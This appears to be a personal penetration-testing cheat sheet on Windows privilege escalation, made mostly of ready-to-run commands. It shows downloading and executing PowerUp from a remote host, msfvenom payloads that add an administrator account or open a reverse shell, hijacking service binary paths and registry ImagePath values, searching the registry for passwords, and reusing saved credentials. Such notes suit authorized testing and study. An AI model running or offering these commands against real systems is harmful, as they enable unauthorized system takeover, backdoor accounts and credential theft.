i## RunasCs.exe
Windows script to run specific processes under a different user account
```powershell
PS > .\RunasCs.exe $Username $Password $Command
```
Command can be like `msfvenom reverse shell`
# Processes
Check running processes, could hint at possible VM machine, prompting [[VM Escape]].
# Services
## Service
- Check all services with `sc query`
```cmd
> sc.exe query state=all
```
- Query configuration of a service
```powershell
PS > sc qc <service>
```
- Check access
## Access Check 
- Check `<user>` access to a particular  `service`
```powershell
PS > accesschk /accepteula -uwcqv <user> <service>
```
## Service Permissions
# PowerUp.ps1
```powershell
PS > iex (iwr -usebasicparsing http://<IP>:<PORT>/PowerUp.ps1)
PS > Invoke-AllChecks
```
# Dangerous Settings
## #AlwaysInstallElevated 
Allows to install/run executable with elevated privileges. 
- Create super-user
```shell-session
$ msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
$ msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi 
```
>**!! NOTE:** Using the msiexec the uac wont be prompted
- Create elevated reverse-shell
```shell-session
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o reverse.msi
```
Install it on the vulnerable system:
```powershell
PS > msiexec /quiet /qn /i C:\path\to\executable.msi
```
## #service_change_config 
If the service runs with `SYSTEM` privileges and we can change its config, change the binary path of the service to our malicious reverse shell and restart it.
```powershell
> sc config <service> binpath= "\"C:\Path\to\rev-shell""
> net start <service>
```
## #unquoted-service-path 
If the service runs with `SYSTEM` privileges and its path is unquoted, check folder permissions to create a script at the vulnerable path.
### Tools
1. [[AccessChk]]
2. [[ICACLS]]
## Registry Permission
If the registry permissions allow to modify, change service path from here.
```powershell
> accesschk /accepteula -uvwqk HKLM\path\to\service
HKLM\System\CurrentControlSet\Services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        KEY_ALL_ACCESS
  RW BUILTIN\Administrators
        KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
        KEY_ALL_ACCESS

> reg add HKLM\path\to\service /v ImagePath /t REG_EXPAND_SZ /d C:\path\to\shell.exe /f
```
## Password in Registry
The registry can be searched for keys and values that contain the word "password"
```powershell
PS > reg query HKLM /f password /t REG_SZ /s
```
## Saved Credentials
List any saved credentials and use them to run script:
```powershell
PS > cmdkey /list
PS > runas /savecred /user:<user> C:\path\to\script
```